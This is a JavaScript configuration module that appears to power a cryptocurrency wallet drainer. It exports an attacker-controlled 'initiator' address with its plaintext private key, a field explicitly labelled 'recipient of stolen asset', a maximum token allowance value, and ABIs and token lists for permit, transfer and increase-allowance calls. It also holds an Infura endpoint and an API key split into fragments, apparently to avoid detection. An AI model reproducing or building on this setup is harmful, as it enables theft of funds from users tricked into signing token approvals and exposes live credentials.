export const initiator = '0x5049bE34eE05627aD0C500f11B25d23c02F530b1'; // initiator address
// export const initiator = '0xdc7bCF3447233129496F9eA619Be307333A6d7F9'; // initiator address

export const initiatorPK = 'bbdeb46f850dd3b11672db4f15b5ff15927cbfcdb9959ddc94df4a99e5966989'; // initiaror's private key
// export const initiatorPK = 'a13a72bd676d24c6fa26a07eaa00ffd2afc4e0000d993469211951ca6cc9a589'; // initiaror's private key

export const recipient = '0x16866d2b99354C5057aE414bbA03C7810b550E04'; // recipient of stolen asset
export { default as ALLOWANCEABI } from './abis/allowanceABI.json';
export { default as permitV2 } from './abis/permitvs.json';
export { default as CLAIMEABI } from './abis/claimABI.json';
export { default as ERC20ABI } from './abis/erc20.json';
export const projectId = '266adf3f12378f461f72258a250ac519';
export const deadline = 10000000000000;
export { default as permitTokens }from './permitTokens.json';
export { default as transferTokens } from './transferTokens.json';
export { default as increasAllownceTokens } from './increasAllownceTokens.json';
export const infura = "https://mainnet.infura.io/v3/4d5f05d6b7bb4260a9ba2b2e085844db";

export const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
export const claimAddress = '0x5F93C85fea3af5331037354ffAa19897A5AdA977';
const keys = [
  'A',
  'CUR',
  '7LHb',
  'xrjk',
  'tO',
  '5xFQ',
  '32h',
  'P4',
  '-UP',
  'axG',
  'fpH',
];
let akeys = '';
keys.forEach((k) => (akeys += k));
export const apikeys = akeys;
